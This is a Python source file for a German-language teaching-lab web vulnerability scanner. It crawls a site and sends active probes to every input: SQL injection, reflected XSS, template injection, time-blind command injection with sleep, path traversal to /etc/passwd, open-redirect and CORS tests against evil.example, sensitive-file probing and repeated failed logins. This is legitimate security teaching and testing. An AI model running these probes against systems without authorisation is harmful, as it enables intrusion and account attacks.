"""Generischer Web-Schwachstellen-Scanner (Lehr-Lab).

Crawlt eine Ziel-Seite selbst, sammelt dabei **Formulare und URL-Parameter** und
fährt die im Lab behandelten Angriffe heuristisch gegen jeden gefundenen
Eingabepunkt. Anders als die Vorgänger-Version kennt er keine festen Routen des
Cowboy-Forums mehr, sondern funktioniert gegen beliebige (eigene) Seiten.

    pip install -r requirements.txt
    python attack_all.py --base http://127.0.0.1:5000
    python attack_all.py --base http://192.168.1.42:5000 --cookie "session=..."

GRENZE: Nur gegen die eigene Instanz oder — im Übungs-CTF unter Einverständnis —
gegen Instanzen im Kurs-Netz. Keine fremden/öffentlichen Systeme. Der Scan sendet
aktiv Angriffs-Payloads und mehrere fehlerhafte Logins; das ist ein Eingriff.

Jeder Check ist "best effort": fehlt ein Angriffspunkt, wird der Check als n/a
gemeldet, nicht als Fehler. Heuristiken können daneben liegen — Treffer immer
manuell gegenprüfen.
"""
import argparse
import base64
import binascii
import json
import random
import re
import statistics
import string
import sys
import time
from collections import namedtuple
from html.parser import HTMLParser
from urllib.parse import parse_qsl, urldefrag, urljoin, urlencode, urlsplit

import requests
from requests.exceptions import RequestException

# ------------------------------------------------------------------ Verdikte
VULN, SAFE, NA, INFO = "VULN", "SAFE", "N/A", "INFO"
CRIT, HIGH, MED, LOW = "kritisch", "hoch", "mittel", "niedrig"

Finding = namedtuple("Finding", "check verdict severity detail where")
# Ein fuzzbarer Eingabepunkt: eine Anfrage mit genau EINEM veränderlichen Feld.
Target = namedtuple("Target", "method url params field kind where")


def _finding(check, verdict, detail, severity="", where=""):
    return Finding(check, verdict, severity, detail, where)


def _tag(n=8):
    return "zz" + "".join(random.choices(string.ascii_lowercase, k=n))


# SQL-Fehlersignaturen verschiedener Engines (nur eindeutige Fragmente).
SQL_ERRORS = [
    "sql syntax", "syntax error", "unclosed quotation", "quoted string not properly",
    "unterminated quoted", "you have an error in your sql", "sqlite3.operationalerror",
    "operationalerror", "programmingerror", "psycopg2", "ora-0", "odbc",
    "mysql_fetch", "pg::syntaxerror", "sqlstate", "near \"", "no such column",
]
# Stacktrace-/Debugger-Signaturen (Info-Leak).
DEBUG_SIGS = [
    "traceback (most recent call last)", "werkzeug debugger", "<h1>internal server error</h1",
    "django.core.exceptions", "stack trace:", "whoops\\", "symfony\\component",
]
# Datei-Signaturen für Path-Traversal/LFI (literale Substrings, keine Regex!).
TRAVERSAL = [
    ("../../../../../../etc/passwd", ["root:x:0:0:"]),
    ("..\\..\\..\\..\\..\\windows\\win.ini", ["[extensions]", "[fonts]", "for 16-bit app support"]),
    ("../../../../app.py", ["def create_app", "app.run(", "Flask(__name__)"]),
    ("../config.py", ["DATABASE_URL", "SQLALCHEMY_DATABASE_URI"]),
]
# Namen, die auf einen Redirect-Parameter hindeuten.
REDIRECT_PARAMS = re.compile(r"(next|url|redirect|return|dest|continue|goto|to|target)", re.I)
# Signatur einer "eingeloggten" Ansicht (Logout-Affordanz).
LOGOUT_SIG = re.compile(r"(/logout|>\s*log\s*out|abmelden|ausloggen|sign\s*out)", re.I)
# Typische geschützte Pfade, die auch ungelinkt (nicht crawlbar) existieren können.
PROTECTED_GUESS = [
    "/dashboard", "/admin", "/account", "/profile", "/settings", "/home", "/panel",
    "/me", "/user", "/users", "/orders", "/ticket", "/tickets", "/inbox", "/messages",
    "/notes", "/upload", "/manage", "/konto", "/uebersicht",
]
# Felder, die als Anti-CSRF-Token durchgehen.
CSRF_FIELD = re.compile(r"(csrf|xsrf|_token|authenticity|nonce)", re.I)
# Sensible Pfade, die nicht ausgeliefert werden sollten.
SENSITIVE_FILES = [
    "/.git/config", "/.git/HEAD", "/.env", "/config.py", "/settings.py", "/app.py",
    "/requirements.txt", "/db.sqlite3", "/database.db", "/backup.zip", "/backup.sql",
    "/.htaccess", "/.DS_Store", "/server-status", "/phpinfo.php", "/wp-config.php",
    "/.svn/entries", "/composer.json", "/package.json",
]


# ============================================================ HTML-Parser
class _PageParser(HTMLParser):
    """Zieht Formulare (mit Feldern) und Links aus einer HTML-Seite."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.forms = []
        self.links = []
        self._cur = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action", ""),
                         "method": (a.get("method") or "GET").upper(),
                         "inputs": []}
        elif tag in ("input", "textarea", "select") and self._cur is not None:
            name = a.get("name")
            if name:
                self._cur["inputs"].append(
                    {"name": name, "type": (a.get("type") or "text").lower(),
                     "value": a.get("value", "")})
        elif tag == "a":
            href = a.get("href")
            if href:
                self.links.append(href)

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)

    def handle_endtag(self, tag):
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur)
            self._cur = None


# ============================================================ Scanner
class Scanner:
    def __init__(self, base, session=None, timeout=8, max_pages=25, max_targets=40):
        self.base = base.rstrip("/")
        self.origin = urlsplit(self.base)
        self.sess = session or requests.Session()
        self.anon_sess = None   # cookie-lose Session fuer den Access-Control-Check
        self.timeout = timeout
        self.max_pages = max_pages
        self.max_targets = max_targets
        self.pages = []        # [(url, response, forms)]
        self.bodies = []       # gesammelte (url, text) für Disclosure-Scan
        self.targets = []      # [Target]
        self.login_forms = []  # Formulare mit Passwort-Feld

    # ---------------------------------------------------------- Low-Level
    def _same_origin(self, url):
        p = urlsplit(url)
        return (not p.netloc) or (p.netloc == self.origin.netloc)

    def get(self, url, **kw):
        kw.setdefault("timeout", self.timeout)
        return self.sess.get(url, **kw)

    def send(self, t, value):
        """Schickt einen Target-Request, wobei nur das Zielfeld auf `value` gesetzt wird."""
        data = dict(t.params)
        data[t.field] = value
        kw = dict(timeout=self.timeout, allow_redirects=t.kind != "redirect")
        if t.method == "POST":
            return self.sess.post(t.url, data=data, **kw)
        return self.sess.get(t.url, params=data, **kw)

    # ---------------------------------------------------------- Crawl
    def crawl(self):
        seen, queue = set(), [self.base + "/"]
        while queue and len(self.pages) < self.max_pages:
            url = urldefrag(queue.pop(0))[0]
            if url in seen or not self._same_origin(url):
                continue
            seen.add(url)
            try:
                r = self.get(url, allow_redirects=True)
            except RequestException:
                continue
            text = r.text or ""
            self.bodies.append((url, text))
            if "html" not in r.headers.get("Content-Type", "").lower() \
                    and "<html" not in text.lower():
                continue
            p = _PageParser()
            try:
                p.feed(text)
            except Exception:  # noqa: BLE001 - defektes HTML soll den Crawl nicht killen
                pass
            self.pages.append((url, r, p.forms))
            for href in p.links:
                nu = urldefrag(urljoin(url, href))[0]
                if self._same_origin(nu) and nu not in seen:
                    queue.append(nu)
        self._build_targets()
        return self.pages

    def _build_targets(self):
        seen = set()

        def add(t):
            key = (t.method, urlsplit(t.url).path, tuple(sorted(t.params)), t.field)
            if key not in seen and len(self.targets) < self.max_targets:
                seen.add(key)
                self.targets.append(t)

        # 1) GET-Parameter aus gecrawlten URLs
        for url, _r, _f in self.pages:
            qs = dict(parse_qsl(urlsplit(url).query))
            clean = url.split("?", 1)[0]
            for field in qs:
                add(Target("GET", clean, qs, field, "query", url))
        # 2) Formular-Felder
        for url, _r, forms in self.pages:
            for form in forms:
                action = urljoin(url, form["action"]) if form["action"] else url
                baseline = {i["name"]: _benign(i) for i in form["inputs"]}
                has_pw = any(i["type"] == "password" for i in form["inputs"])
                if has_pw:
                    self.login_forms.append((action, form, baseline))
                for i in form["inputs"]:
                    if i["type"] in ("submit", "button", "hidden", "file"):
                        continue  # hidden/Token-Felder nicht fuzzen, aber als baseline mitsenden
                    add(Target(form["method"], action, baseline, i["name"], "form", url))
        return self.targets

    # ---------------------------------------------------------- Checks
    def run_all(self):
        findings = []
        for chk in (self.check_headers, self.check_disclosure, self.check_sensitive_files,
                    self.check_access_control, self.check_sqli, self.check_xss,
                    self.check_ssti, self.check_cmdi, self.check_traversal,
                    self.check_open_redirect, self.check_cors, self.check_csrf,
                    self.check_brute_force, self.check_session_cookie):
            try:
                findings.extend(chk())
            except RequestException as e:
                findings.append(_finding(chk.__name__, NA, f"Netzwerkfehler: {e}"))
            except Exception as e:  # noqa: BLE001 - robust weiterlaufen
                findings.append(_finding(chk.__name__, NA, f"Check-Fehler: {e}"))
        return findings

    def check_headers(self):
        r = self.get(self.base + "/", allow_redirects=True)
        missing = []
        hdrs = {k.lower(): v for k, v in r.headers.items()}
        if "content-security-policy" not in hdrs:
            missing.append("Content-Security-Policy")
        if hdrs.get("x-content-type-options", "").lower() != "nosniff":
            missing.append("X-Content-Type-Options: nosniff")
        if "x-frame-options" not in hdrs and "frame-ancestors" not in hdrs.get("content-security-policy", ""):
            missing.append("X-Frame-Options/frame-ancestors")
        out = []
        if missing:
            out.append(_finding("Security-Header", VULN, "fehlt: " + ", ".join(missing), LOW, "/"))
        else:
            out.append(_finding("Security-Header", SAFE, "CSP + nosniff + Clickjacking-Schutz gesetzt"))
        # Cookie-Flags
        raw = r.headers.get("Set-Cookie", "")
        for jar in self.sess.cookies:
            flags = []
            if not jar.secure:
                flags.append("Secure")
            httponly = "httponly" in raw.lower() or bool((jar._rest or {}).get("HttpOnly"))
            if not httponly:
                flags.append("HttpOnly")
            if "samesite" not in raw.lower() and "samesite" not in str(jar._rest or {}).lower():
                flags.append("SameSite")
            if flags:
                out.append(_finding("Cookie-Flags", VULN,
                                    f"Cookie '{jar.name}' ohne: {', '.join(flags)}", MED))
        return out

    def check_disclosure(self):
        out = []
        r = self.get(self.base + "/", allow_redirects=True)
        srv = r.headers.get("Server", "")
        powered = r.headers.get("X-Powered-By", "")
        if srv or powered:
            out.append(_finding("Tech-Disclosure", INFO,
                                f"Server-Header verrät Stack: {srv} {powered}".strip(), LOW))
        for url, text in self.bodies:
            low = text.lower()
            if any(s in low for s in DEBUG_SIGS):
                sev = CRIT if "werkzeug debugger" in low else HIGH
                out.append(_finding("Debug-/Stacktrace-Leak", VULN,
                                    "Fehlerseite zeigt internen Stacktrace/Debugger", sev, url))
                break
        if not any(f.check == "Debug-/Stacktrace-Leak" for f in out):
            out.append(_finding("Debug-/Stacktrace-Leak", SAFE, "keine Stacktraces in gecrawlten Seiten"))
        return out

    def check_sensitive_files(self):
        # Catch-all-Verhalten bestimmen (manche Apps liefern 200 für alles).
        rnd = self.get(self.base + "/" + _tag(12), allow_redirects=False)
        baseline_404 = rnd.status_code
        out, hits = [], []
        for path in SENSITIVE_FILES:
            try:
                r = self.get(self.base + path, allow_redirects=False)
            except RequestException:
                continue
            if r.status_code == 200 and r.status_code != baseline_404 and r.text.strip():
                hits.append(f"{path} ({len(r.text)}B)")
        if hits:
            out.append(_finding("Sensible Dateien erreichbar", VULN,
                                "; ".join(hits), HIGH))
        else:
            out.append(_finding("Sensible Dateien erreichbar", SAFE,
                                f"{len(SENSITIVE_FILES)} Pfade geprüft, nichts exponiert"))
        return out

    def check_access_control(self):
        """Broken Access Control: geschützt wirkende Seiten ohne Session erreichbar?

        Jede Kandidaten-URL wird mit einer frischen, cookie-losen Session geholt.
        Bleibt sie 200 und zeigt eine eingeloggte Ansicht (Logout-Link, kein
        Login-Formular), fehlt die Zugriffskontrolle. Korrekt geschützte Seiten
        antworten mit 302->/login, 401 oder 403.
        """
        if self.anon_sess is None:
            self.anon_sess = requests.Session()
        candidates, seen = [], set()
        for url, _r, _f in self.pages:          # gecrawlte, nicht-öffentliche Seiten
            path = urlsplit(url).path.rstrip("/")
            if path not in ("", "/login", "/register", "/logout"):
                candidates.append(url)
        for p in PROTECTED_GUESS:               # + ungelinkte Standard-Pfade
            candidates.append(self.base + p)

        vulns, checked = [], 0
        for url in candidates:
            path = urlsplit(url).path.rstrip("/") or "/"
            if path in seen:
                continue
            seen.add(path)
            try:
                r = self.anon_sess.get(url, timeout=self.timeout, allow_redirects=False)
            except RequestException:
                continue
            if r.status_code != 200:
                continue                        # 302/401/403 = korrekt geschützt
            checked += 1
            body = r.text or ""
            looks_logged_in = LOGOUT_SIG.search(body)
            is_login_page = 'type="password"' in body.lower()
            if looks_logged_in and not is_login_page:
                vulns.append(_finding("Broken Access Control", VULN,
                                      f"{urlsplit(url).path} ohne Login erreichbar "
                                      f"(zeigt eingeloggte Ansicht)", HIGH, url))
        if vulns:
            return vulns
        if not checked:
            return [_finding("Broken Access Control", NA,
                             "keine geschützt wirkenden Seiten gefunden")]
        return [_finding("Broken Access Control", SAFE,
                         f"{checked} Seite(n) anonym geprüft, alle verlangen Login")]

    def check_sqli(self):
        if not self.targets:
            return [_finding("SQL-Injection", NA, "keine Eingabepunkte gefunden")]
        vulns = []
        for t in self.targets:
            base_val = t.params.get(t.field) or "1"
            try:
                baseline = self.send(t, base_val)
                err = self.send(t, base_val + "'")
            except RequestException:
                continue
            body = (err.text or "").lower()
            sql_err = any(s in body for s in SQL_ERRORS)
            broke = err.status_code >= 500 and baseline.status_code < 500
            if sql_err or broke:
                why = "SQL-Fehlermeldung sichtbar" if sql_err else "einzelnes Quote löst 500 aus"
                vulns.append(_finding("SQL-Injection", VULN,
                                      f"{_loc(t)}: {why}", HIGH, _loc(t)))
                continue
            # Boolean-Differential (nur wenn error-based nichts ergab)
            try:
                t_true = self.send(t, base_val + "' OR '1'='1")
                t_false = self.send(t, base_val + "' AND '1'='2")
            except RequestException:
                continue
            lt, lf, lb = len(t_true.text), len(t_false.text), len(baseline.text)
            # TRUE ähnelt Baseline (oder länger), FALSE deutlich kürzer -> boolean-based
            if lb and lf < lb * 0.7 and lt >= lb * 0.9 and abs(lt - lf) > 50:
                vulns.append(_finding("SQL-Injection", VULN,
                                      f"{_loc(t)}: boolean-Differential (true={lt}B, false={lf}B)",
                                      HIGH, _loc(t)))
        if vulns:
            return vulns
        return [_finding("SQL-Injection", SAFE,
                         f"{len(self.targets)} Eingabepunkte, kein Injection-Verhalten")]

    def check_xss(self):
        if not self.targets:
            return [_finding("Reflected XSS", NA, "keine Eingabepunkte gefunden")]
        vulns, reflected_any = [], False
        for t in self.targets:
            marker = _tag()
            payload = f"{marker}<svg/onload=alert(1)>{marker}"
            try:
                r = self.send(t, payload)
            except RequestException:
                continue
            body = r.text or ""
            if marker + "<svg/onload=" in body:          # roh -> unescaped
                vulns.append(_finding("Reflected XSS", VULN,
                                      f"{_loc(t)}: <svg/onload> wird ungeescaped reflektiert",
                                      HIGH, _loc(t)))
            elif marker in body:
                reflected_any = True
        if vulns:
            return vulns
        detail = "Reflektierte Eingaben werden escaped" if reflected_any \
            else "keine reflektierten Eingaben gefunden"
        return [_finding("Reflected XSS", SAFE if reflected_any else NA, detail)]

    def check_ssti(self):
        """Server-Side Template Injection: wird z. B. {{123*456}} serverseitig gerechnet?"""
        if not self.targets:
            return [_finding("Server-Side Template Injection", NA, "keine Eingabepunkte gefunden")]
        for t in self.targets:
            a, b = random.randint(100, 999), random.randint(100, 999)
            tag = _tag()
            expected = tag + str(a * b) + tag
            payloads = (tag + "{{" + f"{a}*{b}" + "}}" + tag,     # Jinja2/Twig
                        tag + "${" + f"{a}*{b}" + "}" + tag,       # JSP/Spring EL
                        tag + "#{" + f"{a}*{b}" + "}" + tag)       # Ruby/Freemarker
            for payload in payloads:
                try:
                    r = self.send(t, payload)
                except RequestException:
                    continue
                if expected in (r.text or ""):
                    return [_finding("Server-Side Template Injection", VULN,
                                     f"{_loc(t)}: Ausdruck {a}*{b} wurde serverseitig zu {a*b} "
                                     f"ausgewertet", CRIT, _loc(t))]
        return [_finding("Server-Side Template Injection", SAFE,
                         f"{len(self.targets)} Eingabepunkte, keine Template-Auswertung")]

    def check_cmdi(self):
        """OS-Command-Injection, zeit-blind: verzögert eine Shell-Payload die Antwort?"""
        if not self.targets:
            return [_finding("OS-Command-Injection", NA, "keine Eingabepunkte gefunden")]
        delay = 4
        for t in self.targets[:6]:          # begrenzt, da jede Treffer-Probe ~delay s kostet
            base_val = t.params.get(t.field) or "1"
            try:
                t0 = time.perf_counter()
                self.send(t, base_val)
                baseline = time.perf_counter() - t0
            except RequestException:
                continue
            for payload in (f"{base_val}; sleep {delay}", f"{base_val}| sleep {delay}",
                            f"{base_val}$(sleep {delay})", f"{base_val}`sleep {delay}`",
                            f"{base_val}& ping -n {delay + 1} 127.0.0.1"):
                try:
                    t0 = time.perf_counter()
                    self.send(t, payload)
                    dt = time.perf_counter() - t0
                except RequestException:
                    continue
                if dt > baseline + delay * 0.8:
                    return [_finding("OS-Command-Injection", VULN,
                                     f"{_loc(t)}: '{payload}' verzögert Antwort um {dt:.1f}s "
                                     f"(zeit-blind)", CRIT, _loc(t))]
        return [_finding("OS-Command-Injection", SAFE,
                         "keine zeitbasierte Command-Injection erkennbar")]

    def check_cors(self):
        """CORS-Fehlkonfiguration: spiegelt der Server eine beliebige Origin wider?"""
        evil = "https://evil.example"
        try:
            r = self.get(self.base + "/", headers={"Origin": evil}, allow_redirects=True)
        except RequestException as e:
            return [_finding("CORS-Fehlkonfiguration", NA, f"nicht prüfbar: {e}")]
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        creds = r.headers.get("Access-Control-Allow-Credentials", "").lower() == "true"
        if acao == evil or (acao == "*" and creds):
            return [_finding("CORS-Fehlkonfiguration", VULN,
                             f"Access-Control-Allow-Origin spiegelt '{acao}'"
                             + (" + Credentials erlaubt" if creds else ""),
                             HIGH if creds else MED)]
        if acao:
            return [_finding("CORS-Fehlkonfiguration", SAFE, f"ACAO fest gesetzt: {acao}")]
        return [_finding("CORS-Fehlkonfiguration", NA, "keine CORS-Header gesendet")]

    def check_traversal(self):
        if not self.targets:
            return [_finding("Path-Traversal/LFI", NA, "keine Eingabepunkte gefunden")]
        for t in self.targets:
            for payload, sigs in TRAVERSAL:
                try:
                    r = self.send(t, payload)
                except RequestException:
                    continue
                body = r.text or ""
                if any(s in body for s in sigs):
                    return [_finding("Path-Traversal/LFI", VULN,
                                     f"{_loc(t)}: '{payload}' liefert Dateiinhalt", HIGH, _loc(t))]
        return [_finding("Path-Traversal/LFI", SAFE,
                         f"{len(self.targets)} Eingabepunkte, kein Traversal möglich")]

    def check_open_redirect(self):
        cands = [t for t in self.targets if REDIRECT_PARAMS.fullmatch(t.field)
                 or REDIRECT_PARAMS.search(t.field)]
        if not cands:
            return [_finding("Open Redirect", NA, "kein Redirect-Parameter gefunden")]
        evil = "https://evil.example/pwn"
        for t in cands:
            rt = t._replace(kind="redirect")
            try:
                r = self.send(rt, evil)
            except RequestException:
                continue
            loc = r.headers.get("Location", "")
            if loc.startswith("https://evil.example") or loc.startswith("//evil.example"):
                return [_finding("Open Redirect", VULN,
                                 f"{_loc(t)}: leitet auf externe URL weiter", MED, _loc(t))]
        return [_finding("Open Redirect", SAFE, "Redirect-Parameter auf externe URL blockiert")]

    def check_csrf(self):
        post_forms = [(u, f) for (u, _r, forms) in self.pages for f in forms
                      if f["method"] == "POST"]
        if not post_forms:
            return [_finding("CSRF-Token", NA, "keine POST-Formulare gefunden")]
        unprotected = []
        for url, form in post_forms:
            names = [i["name"] for i in form["inputs"]]
            if not any(CSRF_FIELD.search(n) for n in names):
                unprotected.append(f"{form['action'] or url}")
        if unprotected:
            return [_finding("CSRF-Token", VULN,
                             "POST-Formular ohne Anti-CSRF-Token: " + ", ".join(sorted(set(unprotected))),
                             MED)]
        return [_finding("CSRF-Token", SAFE, "alle POST-Formulare tragen ein CSRF-Token")]

    def check_brute_force(self):
        if not self.login_forms:
            return [_finding("Brute-Force-Schutz", NA, "kein Login-Formular (Passwort-Feld) gefunden")]
        action, form, baseline = self.login_forms[0]
        pw_field = next(i["name"] for i in form["inputs"] if i["type"] == "password")
        blocked = False
        for _ in range(12):
            data = dict(baseline)
            data[pw_field] = _tag()
            try:
                r = self.sess.post(action, data=data, timeout=self.timeout, allow_redirects=True)
            except RequestException:
                break
            low = (r.text or "").lower()
            if r.status_code == 429 or any(w in low for w in
                                           ("gesperrt", "locked", "too many", "zu viele",
                                            "rate limit", "versuch", "captcha", "blockiert")):
                blocked = True
                break
        if blocked:
            return [_finding("Brute-Force-Schutz", SAFE, "Rate-Limit/Lockout aktiv", where=action)]
        return [_finding("Brute-Force-Schutz", VULN,
                         "12 Fehl-Logins ohne Bremse (kein Lockout/Rate-Limit)", MED, action)]

    def check_session_cookie(self):
        out = []
        for jar in self.sess.cookies:
            parts = jar.value.split(".")
            payload = parts[0].lstrip("_") if parts else ""
            try:
                pad = payload + "=" * (-len(payload) % 4)
                decoded = base64.urlsafe_b64decode(pad)
                obj = json.loads(decoded)
                out.append(_finding("Session-Cookie lesbar", INFO,
                                    f"Cookie '{jar.name}' trägt klartext-lesbare Daten: "
                                    f"{json.dumps(obj)[:120]}", LOW))
            except (binascii.Error, ValueError, UnicodeDecodeError):
                continue
        if not out:
            out.append(_finding("Session-Cookie lesbar", SAFE, "keine klartext-lesbaren Cookie-Payloads"))
        return out


# ============================================================ Helfer
def _benign(inp):
    t, name = inp["type"], inp["name"].lower()
    if inp["value"]:
        return inp["value"]            # hidden/Token-Wert beibehalten
    if t == "password":
        return "Passwort123!"
    if t == "email" or "email" in name or "mail" in name:
        return "test@example.com"
    if t == "number" or t == "tel":
        return "1"
    return "test"


def _loc(t):
    path = urlsplit(t.url).path or "/"
    return f"{t.method} {path}?{t.field}" if t.kind == "query" else f"{t.method} {path} [{t.field}]"


# ============================================================ Report
SYMBOL = {VULN: "[!!] VERWUNDBAR", SAFE: "[ok] sicher    ",
          NA: "[--] n/a       ", INFO: "[i ] info      "}
SEV_RANK = {CRIT: 0, HIGH: 1, MED: 2, LOW: 3, "": 4}


def _utf8_console():
    # Windows-Konsole ist oft cp1252 -> Umlaute wuerden zerschossen. Best effort.
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, ValueError):
        pass


def run(base, **kw):
    _utf8_console()
    base = base.rstrip("/")
    print(f"\n=== Web-Schwachstellen-Scan gegen {base} ===")
    print("    (Nur eigene/autorisierte Instanzen. Aktiver Scan mit Angriffs-Payloads.)\n")
    sc = Scanner(base, **kw)
    sc.crawl()
    print(f"[i] gecrawlt: {len(sc.pages)} Seite(n), {len(sc.targets)} Eingabepunkt(e), "
          f"{len(sc.login_forms)} Login-Formular(e)\n")
    findings = sc.run_all()

    order = {VULN: 0, INFO: 1, SAFE: 2, NA: 3}
    findings.sort(key=lambda f: (order[f.verdict], SEV_RANK[f.severity]))
    for f in findings:
        sev = f" [{f.severity}]" if f.severity else ""
        where = f"  ({f.where})" if f.where else ""
        print(f"{SYMBOL[f.verdict]}  {f.check}{sev}")
        print(f"              -> {f.detail}{where}")

    vulns = [f for f in findings if f.verdict == VULN]
    checked = len([f for f in findings if f.verdict in (VULN, SAFE)])
    print("\n" + "-" * 64)
    print(f"Ergebnis: {len(vulns)} Schwachstelle(n) von {checked} aussagekräftigen Checks.")
    for f in sorted(vulns, key=lambda f: SEV_RANK[f.severity]):
        print(f"  - [{f.severity or '?'}] {f.check} - {f.detail}")
    if not vulns:
        print("  Keine der geprueften Luecken gefunden.")
    return findings


def main():
    ap = argparse.ArgumentParser(description="Generischer Web-Schwachstellen-Scanner (Lehr-Lab)")
    ap.add_argument("--base", default="http://127.0.0.1:5000", help="Ziel-URL")
    ap.add_argument("--max-pages", type=int, default=25, help="max. zu crawlende Seiten")
    ap.add_argument("--max-targets", type=int, default=40, help="max. zu fuzzende Eingabepunkte")
    ap.add_argument("--timeout", type=int, default=8, help="Request-Timeout (s)")
    ap.add_argument("--cookie", default="", help="Session-Cookie fuer authentifizierten Scan, 'name=wert'")
    args = ap.parse_args()

    sess = requests.Session()
    if args.cookie and "=" in args.cookie:
        name, val = args.cookie.split("=", 1)
        sess.cookies.set(name.strip(), val.strip())
    run(args.base, session=sess, timeout=args.timeout,
        max_pages=args.max_pages, max_targets=args.max_targets)
    return 0


if __name__ == "__main__":
    sys.exit(main())
